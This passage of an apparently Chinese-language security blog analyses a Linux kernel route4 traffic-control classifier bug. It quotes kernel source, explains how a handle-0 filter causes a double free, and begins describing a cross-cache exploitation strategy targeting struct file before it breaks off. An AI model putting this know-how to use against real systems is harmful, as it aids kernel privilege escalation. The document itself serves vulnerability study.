= PTR_ERR(tp-&gt;ops);</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">tp-&gt;classify = tp-&gt;ops-&gt;classify;</span><br><span class="line">tp-&gt;protocol = protocol;</span><br><span class="line">tp-&gt;prio = prio;</span><br><span class="line">tp-&gt;chain = chain;</span><br><span class="line">spin_lock_init(&amp;tp-&gt;lock);</span><br><span class="line">refcount_set(&amp;tp-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">err = tp-&gt;ops-&gt;init(tp);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">module_put(tp-&gt;ops-&gt;owner);</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> tp;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line">kfree(tp);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是为tp分配了一个<code>object</code>随后通过<code>tcf_proto_lookup_ops</code>函数根据<code>kind</code>获取到对应的ops</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto_ops</span> *__<span class="title">tcf_proto_lookup_ops</span>(<span class="title">const</span> <span class="title">char</span> *<span class="title">kind</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto_ops</span> *<span class="title">t</span>, *<span class="title">res</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kind) &#123;</span><br><span class="line">read_lock(&amp;cls_mod_lock);</span><br><span class="line">list_for_each_entry(t, &amp;tcf_proto_base, head) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(kind, t-&gt;kind) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (try_module_get(t-&gt;owner))</span><br><span class="line">res = t;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">read_unlock(&amp;cls_mod_lock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里以route为例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto_ops</span> <span class="title">cls_route4_ops</span> __<span class="title">read_mostly</span> =</span> &#123;</span><br><span class="line">.kind=<span class="string">&quot;route&quot;</span>,</span><br><span class="line">.classify=route4_classify,</span><br><span class="line">.init=route4_init,</span><br><span class="line">.destroy=route4_destroy,</span><br><span class="line">.get=route4_get,</span><br><span class="line">.change=route4_change,</span><br><span class="line">.<span class="keyword">delete</span>=route4_delete,</span><br><span class="line">.walk=route4_walk,</span><br><span class="line">.dump=route4_dump,</span><br><span class="line">.bind_class=route4_bind_class,</span><br><span class="line">.owner=THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面的ops将会获得如上<code>cls_route4_ops</code>结构体随后会调用<code>tp-&gt;ops-&gt;init(tp)</code>进行初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_init</span><span class="params">(struct tcf_proto *tp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span>;</span></span><br><span class="line"></span><br><span class="line">head = kzalloc(<span class="keyword">sizeof</span>(struct route4_head), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOBUFS;</span><br><span class="line"></span><br><span class="line">rcu_assign_pointer(tp-&gt;root, head);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到该函数会生成一个<code>route4_head</code>结构体，此结构体的作用是用于存放过滤器对应的哈希值。</p><p>接着回到<code>tc_new_tfilter</code>函数，其会将新生成的tp加入到chain中。接下来就会通过<code>fh = tp-&gt;ops-&gt;get(tp, t-&gt;tcm_handle)</code>语句调用对应的get函数，根据<code>tcm_handle</code>获取到过滤器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">route4_get</span><span class="params">(struct tcf_proto *tp, u32 handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span> =</span> rtnl_dereference(tp-&gt;root);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> *<span class="title">b</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> h1, h2;</span><br><span class="line"></span><br><span class="line">h1 = to_hash(handle);</span><br><span class="line"><span class="keyword">if</span> (h1 &gt; <span class="number">256</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">h2 = from_hash(handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line"><span class="keyword">if</span> (h2 &gt; <span class="number">32</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">b = rtnl_dereference(head-&gt;table[h1]);</span><br><span class="line"><span class="keyword">if</span> (b) &#123;</span><br><span class="line"><span class="keyword">for</span> (f = rtnl_dereference(b-&gt;ht[h2]);</span><br><span class="line">     f;</span><br><span class="line">     f = rtnl_dereference(f-&gt;next))</span><br><span class="line"><span class="keyword">if</span> (f-&gt;handle == handle)</span><br><span class="line"><span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会根据<code>handle</code>从<code>route4_head</code>链表中获取对应的<code>route4_filter</code>。如果返回为空，会接着进入到<code>tc_new_tfilter</code>函数的后续流程，最终在<code>tp-&gt;ops-&gt;change(net, skb, tp, cl, t-&gt;tcm_handle, tca, &amp;fh, flags, extack)</code>语句调用<code>change</code>函数创建一个新的过滤器。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞出现在<code>route4_change</code>函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_change</span><span class="params">(struct net *net, struct sk_buff *in_skb,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct tcf_proto *tp, <span class="keyword">unsigned</span> <span class="keyword">long</span> base, u32 handle,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct nlattr **tca, <span class="keyword">void</span> **arg, u32 flags,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span> =</span> rtnl_dereference(tp-&gt;root);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span> **<span class="title">fp</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">fold</span>, *<span class="title">f1</span>, *<span class="title">pfp</span>, *<span class="title">f</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> *<span class="title">b</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">opt</span> =</span> tca[TCA_OPTIONS];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">TCA_ROUTE4_MAX</span> + 1];</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> h, th;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">new</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (opt == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> handle ? -EINVAL : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err = nla_parse_nested_deprecated(tb, TCA_ROUTE4_MAX, opt,</span><br><span class="line">  route4_policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">fold = *arg;</span><br><span class="line"><span class="keyword">if</span> (fold &amp;&amp; handle &amp;&amp; fold-&gt;handle != handle)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">err = -ENOBUFS;</span><br><span class="line">f = kzalloc(<span class="keyword">sizeof</span>(struct route4_filter), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!f)</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">err = tcf_exts_init(&amp;f-&gt;exts, net, TCA_ROUTE4_ACT, TCA_ROUTE4_POLICE);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fold) &#123;</span><br><span class="line">f-&gt;id = fold-&gt;id;</span><br><span class="line">f-&gt;iif = fold-&gt;iif;</span><br><span class="line">f-&gt;res = fold-&gt;res;</span><br><span class="line">f-&gt;handle = fold-&gt;handle;</span><br><span class="line"></span><br><span class="line">f-&gt;tp = fold-&gt;tp;</span><br><span class="line">f-&gt;bkt = fold-&gt;bkt;</span><br><span class="line"><span class="keyword">new</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = route4_set_parms(net, tp, base, f, handle, head, tb,</span><br><span class="line">       tca[TCA_RATE], <span class="keyword">new</span>, flags, extack);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">h = from_hash(f-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">fp = &amp;f-&gt;bkt-&gt;ht[h];</span><br><span class="line"><span class="keyword">for</span> (pfp = rtnl_dereference(*fp);</span><br><span class="line">     (f1 = rtnl_dereference(*fp)) != <span class="literal">NULL</span>;</span><br><span class="line">     fp = &amp;f1-&gt;next)</span><br><span class="line"><span class="keyword">if</span> (f-&gt;handle &lt; f1-&gt;handle)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">tcf_block_netif_keep_dst(tp-&gt;chain-&gt;block);</span><br><span class="line">rcu_assign_pointer(f-&gt;next, f1);</span><br><span class="line">rcu_assign_pointer(*fp, f);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</span><br><span class="line">th = to_hash(fold-&gt;handle);</span><br><span class="line">h = from_hash(fold-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">b = rtnl_dereference(head-&gt;table[th]);</span><br><span class="line"><span class="keyword">if</span> (b) &#123;</span><br><span class="line">fp = &amp;b-&gt;ht[h];</span><br><span class="line"><span class="keyword">for</span> (pfp = rtnl_dereference(*fp); pfp;</span><br><span class="line">     fp = &amp;pfp-&gt;next, pfp = rtnl_dereference(*fp)) &#123;</span><br><span class="line"><span class="keyword">if</span> (pfp == fold) &#123;</span><br><span class="line">rcu_assign_pointer(*fp, fold-&gt;next);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">route4_reset_fastmap(head);</span><br><span class="line">*arg = f;</span><br><span class="line"><span class="keyword">if</span> (fold) &#123;</span><br><span class="line">tcf_unbind_filter(tp, &amp;fold-&gt;res);</span><br><span class="line">tcf_exts_get_net(&amp;fold-&gt;exts);</span><br><span class="line">tcf_queue_work(&amp;fold-&gt;rwork, route4_delete_filter_work);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line"><span class="keyword">if</span> (f)</span><br><span class="line">tcf_exts_destroy(&amp;f-&gt;exts);</span><br><span class="line">kfree(f);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单分析一下，这里会进一步解析数据包，通过<code>fold = *arg;</code>语句拿出<code>route4_filter</code>，然后判断是否存在，是否<code>handle</code>，<code>handle</code>是否一致，因为是第一次创建这里的<code>fold</code>为空。接着会通过<code>f = kzalloc(sizeof(struct route4_filter), GFP_KERNEL)</code>创建一个结构体，并对其调用<code>tcf_exts_init</code>函数进行初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">tcf_exts_init</span><span class="params">(struct tcf_exts *exts, struct net *net,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> action, <span class="keyword">int</span> police)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET_CLS_ACT</span></span><br><span class="line">exts-&gt;type = <span class="number">0</span>;</span><br><span class="line">exts-&gt;nr_actions = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* Note: we do not own yet a reference on net.</span></span><br><span class="line"><span class="comment"> * This reference might be taken later from tcf_exts_get_net().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">exts-&gt;net = net;</span><br><span class="line">exts-&gt;actions = kcalloc(TCA_ACT_MAX_PRIO, <span class="keyword">sizeof</span>(struct tc_action *),</span><br><span class="line">GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!exts-&gt;actions)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">exts-&gt;action = action;</span><br><span class="line">exts-&gt;police = police;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上述看书可以看到如果内核开启了<code>CONFIG_NET_CLS_ACT</code>选项就会对其分配<code>actions</code>成员，分配的大小是256字节。完毕之后回到<code>route4_change</code>中，如果<code>fold</code>存在，则会将其数据域复制给<code>f</code>。随后调用<code>route4_set_parms</code>函数设置其他参数，后面将新创建的<code>route4_filter</code>的hash值放到对应的<code>route4_head</code>中。</p><p>接下来进入<code>if (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</code>分支中删除掉旧的<code>route4_filter</code>的哈希值，当然在第一次运行时这里是不会进入的。</p><p>在最后判断<code>fold</code>是否为空，如果不为空则调用<code>tcf_queue_work</code>函数对其进行释放操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">tcf_queue_work</span><span class="params">(struct rcu_work *rwork, <span class="keyword">work_func_t</span> func)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">INIT_RCU_WORK(rwork, func);</span><br><span class="line"><span class="keyword">return</span> queue_rcu_work(tc_filter_wq, rwork);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(tcf_queue_work);</span><br></pre></td></tr></table></figure><p>这个函数是个rcu回调，这里就看他的回调函数即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __route4_delete_filter(struct route4_filter *f)</span><br><span class="line">&#123;</span><br><span class="line">tcf_exts_destroy(&amp;f-&gt;exts);</span><br><span class="line">tcf_exts_put_net(&amp;f-&gt;exts);</span><br><span class="line">kfree(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">route4_delete_filter_work</span><span class="params">(struct work_struct *work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">f</span> =</span> container_of(to_rcu_work(work),</span><br><span class="line">       struct route4_filter,</span><br><span class="line">       rwork);</span><br><span class="line">rtnl_lock();</span><br><span class="line">__route4_delete_filter(f);</span><br><span class="line">rtnl_unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以其函数实现就是删除对应的成员之后删除掉<code>f</code>。</p><p>通过上述流程看起来还是蛮正常的，这里出现问题的地方在清除<code>hash</code>和最后释放结构体的if条件不一致导致的。可以注意到的是在前面清楚哈希值时会判断其<code>handle</code>是否存在，如果不存在则不会进入。但是后面只是判断了<code>fold</code>是否存在，如果我们创建一个<code>handle</code>为0的过滤器则不会进入到上面的分支中只会进入到下面的分支中，从而导致其索引还残留在<code>route4_head</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_delete</span><span class="params">(struct tcf_proto *tp, <span class="keyword">void</span> *arg, <span class="keyword">bool</span> *last,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">bool</span> rtnl_held, struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span> =</span> rtnl_dereference(tp-&gt;root);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">f</span> =</span> arg;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span> **<span class="title">fp</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">nf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> *<span class="title">b</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> i, h1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!head || !f)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">h = f-&gt;handle;</span><br><span class="line">b = f-&gt;bkt;</span><br><span class="line"></span><br><span class="line">fp = &amp;b-&gt;ht[from_hash(h &gt;&gt; <span class="number">16</span>)];</span><br><span class="line"><span class="keyword">for</span> (nf = rtnl_dereference(*fp); nf;</span><br><span class="line">     fp = &amp;nf-&gt;next, nf = rtnl_dereference(*fp)) &#123;</span><br><span class="line"><span class="keyword">if</span> (nf == f) &#123;</span><br><span class="line"><span class="comment">/* unlink it */</span></span><br><span class="line">RCU_INIT_POINTER(*fp, rtnl_dereference(f-&gt;next));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove any fastmap lookups that might ref filter</span></span><br><span class="line"><span class="comment"> * notice we unlink&#x27;d the filter so we can&#x27;t get it</span></span><br><span class="line"><span class="comment"> * back in the fastmap.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">route4_reset_fastmap(head);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Delete it */</span></span><br><span class="line">tcf_unbind_filter(tp, &amp;f-&gt;res);</span><br><span class="line">tcf_exts_get_net(&amp;f-&gt;exts);</span><br><span class="line">tcf_queue_work(&amp;f-&gt;rwork, route4_delete_filter_work);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Strip RTNL protected tree */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; i++) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">rt</span>;</span></span><br><span class="line"></span><br><span class="line">rt = rtnl_dereference(b-&gt;ht[i]);</span><br><span class="line"><span class="keyword">if</span> (rt)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* OK, session has no flows */</span></span><br><span class="line">RCU_INIT_POINTER(head-&gt;table[to_hash(h)], <span class="literal">NULL</span>);</span><br><span class="line">kfree_rcu(b, rcu);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">*last = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (h1 = <span class="number">0</span>; h1 &lt;= <span class="number">256</span>; h1++) &#123;</span><br><span class="line"><span class="keyword">if</span> (rcu_access_pointer(head-&gt;table[h1])) &#123;</span><br><span class="line">*last = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里再次关注ops中的<code>route4_delete</code>函数，这个函数的作用是释放所有的过滤器，这里使用的依旧是<code>route4_delete_filter_work</code>函数进行删除的，由于前面提到的<code>route4_head</code>中仍然残存<code>handle</code>为0的过滤器的哈希值，因此会对<code>route4_filter</code>和<code>route4_filter-&gt;exts-&gt;actions</code>对象存在<code>double free</code>。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>(这里的利用机制我没有在文章中提过，但等我看完了发现我以前在适配CVE-2023-3269的时候学过T_T，<del>属于是白忙活一场了</del>)</p><p>既然以前的文章中没提到这里就详细介绍一下，既然这篇文章介绍了那就不再写今年那个CVE的分析文章了。</p><h3 id="cross-cache"><a href="#cross-cache" class="headerlink" title="cross-cache"></a>cross-cache</h3><p>在前面提到，这一利用手法是用于解决内核内部隔离存在的，在CVE-2023-3269的这篇文章中则是用于绕过NUMA机制使用的，只不过在<code>StackRot</code>利用条件更为苛刻，在把这一手法讲解完毕之后简单提一下。</p><p>在前面的一篇文章中详细的解释了内核中的内部隔离机制，大家应该也已经知道了<code>GFP_KERNEL_ACCOUNT</code>标识位和<code>GFP_KERNEL</code>标识位去申请<code>object</code>的时候会从不同的<code>cache</code>中去取。</p><p>说到本篇文章，我们前面提到的可以对两个对象进行<code>Double free</code>，其分别是<code>route4_filter</code>和<code>route4_filter-&gt;exts-&gt;actions</code>，这里主要关注他们的大小，其分别是144和256，会从不同的<code>cache</code>中去取，分别是<code>kmalloc-192</code>和<code>kmalloc-256</code>。而在内核的默认配置中<code>file</code>结构体的大小正好为256，自然而然可以联想到，如果首先使用一个可写的文件占据此位置，再释放掉再使用我们目标的文件去占取再通过某些手法是否可以达成类似于<code>dirty 